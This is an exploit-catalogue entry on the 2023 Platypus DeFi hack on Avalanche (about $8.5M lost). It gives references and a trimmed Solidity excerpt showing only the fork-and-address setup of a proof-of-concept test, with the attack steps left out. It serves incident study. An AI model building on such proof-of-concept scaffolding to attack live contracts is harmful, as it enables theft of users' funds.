# [?] - Platypusdefi - Business Logic Flaw

## Summary
Severity: Unknown
Chain: Avalanche
Component: Platypus
Published: 2023-02-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Platypus_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$8.5M
References:
- https://twitter.com/peckshield/status/1626367531480125440
- https://twitter.com/spreekaway/status/1626319585040338953
- https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430

```solidity
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 USP = IERC20(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);
    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 USDT = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
    IERC20 USDT_E = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 BUSD = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    IERC20 DAI_E = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    IERC20 LPUSDC = IERC20(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    PlatypusPool Pool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    MasterPlatypusV4 Master = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    PlatypusTreasure Treasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("avalanche", 26_343_613);
        cheats.label(address(USDC), "USDC");
        cheats.label(address(USP), "USP");
        cheats.label(address(USDC_E), "USDC_E");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(USDT_E), "USDT_E");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(DAI_E), "DAI_E");
        cheats.label(address(LPUSDC), "LPUSDC");
        cheats.label(address(Pool), "Pool");
        cheats.label(address(Master), "Master");
        cheats.label(address(Treasure), "Treasure");
        cheats.label(address(aaveV3), "aaveV3");
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Platypus_exp.sol_
